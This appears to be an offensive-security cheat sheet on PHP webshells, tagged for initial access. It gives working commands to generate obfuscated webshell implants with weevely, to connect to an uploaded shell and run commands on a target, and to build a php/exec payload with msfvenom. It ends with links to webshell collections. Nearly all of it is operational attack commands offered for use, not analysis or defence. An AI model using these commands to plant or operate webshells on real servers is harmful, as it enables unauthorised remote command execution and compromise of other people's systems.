---
author(s):
  - Userware
tags:
  - webapp-pentesting
  - initial-access
  - webshell
  - cross-platform
  - weevely
  - metasploit-framework
---
# PHP

Unlike the regular shells with network sockets (reverse shells and bind shells) that we use to receive a connection. Webshells functions way differently that it doesn't require port forwarding nor a C2 server when sending commands from the attacker. It only requires to send HTTP request to execute commands from the foothold.

## 01 - Generate via `weevely`

Generate a webshell implant and it's obfuscated by default.

```
$ weevely generate $(openssl rand -hex 6) <path>

$ weevely generate -obfuscator phar $(openssl rand -hex 6) implant.php

$ weevely generate -obfuscator obfusc1_php $(openssl rand -hex 6) implant.php
```

Generate a webshell implant without obfuscation.

```
$ weevely generate -obfuscator cleartext1_php $(openssl rand -hex 6) implant.php
```

After successfully uploading on the target's system we can finally move on to post exploitation phase.

```
$ weevely terminal <URL> <password>

$ weevely terminal <URL> <password> "[commands]"
```

To reconnect the session in case when you suddenly got disconnected.

```
$ weevely session /path/to/session

$ weevely session /path/to/session "[commands]"
```

## 02 - Generate via `msfvenom`

Executable webshells.

```
$ msfvenom -p php/exec cmd="<commands>" -f raw -o implant.php
```

After generating the PHP implant include the tags to ensure execution.

```
$ xclip -selection clipboard implant.php && echo '<?php ' | tr -d '\n'> shell.php && xclip -selection clipboard -o >> implant.php
```

## 03 - Laudanum

You can navigate to `/usr/share/laudanum` or `/usr/share/webshells` based on what pentest OS distribution you have or you can clone it on github.

## 04 - SecurityNotFound

```
$ git clone --depth=1 https://github.com/CosasDePuma/SecurityNotFound.git /opt/webshells/SecurityNotFound/
```

---
## References

### Backlinks

- [[Random Characters]]

### Source Repositories

- [tennc: webshell](https://github.com/tennc/webshell)

- [Blackarch: Webshells](https://github.com/BlackArch/webshells)

- [JohnTroony: PHP-Webshells](https://github.com/JohnTroony/php-webshells)

- [Archive-Puma: SecurityNotFound](https://github.com/Archive-Puma/SecurityNotFound)

- [Arrexel: PHPBash](https://github.com/Arrexel/phpbash)

- [flozz: p0wny-shell](https://github.com/flozz/p0wny-shell)

- [gellin: bantam](https://github.com/gellin/bantam)

- [Description of WWolf](https://www.whitewinterwolf.com/tags/php-webshell/)

- [WWolf-PHP-Webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)